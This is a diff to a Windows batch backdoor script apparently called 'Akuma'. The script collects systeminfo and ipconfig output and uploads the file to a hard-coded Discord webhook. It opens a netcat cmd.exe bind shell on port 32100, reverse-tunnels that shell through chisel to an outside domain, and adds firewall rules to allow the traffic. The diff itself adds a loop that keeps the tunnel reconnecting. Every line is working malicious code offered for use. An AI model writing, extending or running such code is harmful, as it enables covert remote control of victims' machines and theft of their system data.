@@ -15,7 +15,9 @@ echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi
 echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi" https://discord.com/api/webhooks/1165910868031197255/h9_Fo0Wm3rs8oeVYh0OjZpEcLikL4AysneV7u3fW553KFjRlBeC-KnzGJmTJoZnGzQwB >> %homedrive%\Akuma\zonbi.bat
 echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\nc.bat
+echo :loop >> %homedrive%\Akuma\chisel.bat
 echo %homedrive%\Akuma\chisel.exe client akuma.4kum4n0d3z3r0.xyz:32101 R:%random%:localhost:32100 >> %homedrive%\Akuma\chisel.bat
+echo goto loop >> %homedrive%\Akuma\chisel.bat
 echo netsh advfirewall firewall delete rule name=".akuma" >> %homedrive%\Akuma\network.bat
 echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
 echo netsh advfirewall firewall add rule name=".akuma" dir=out action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\network.bat
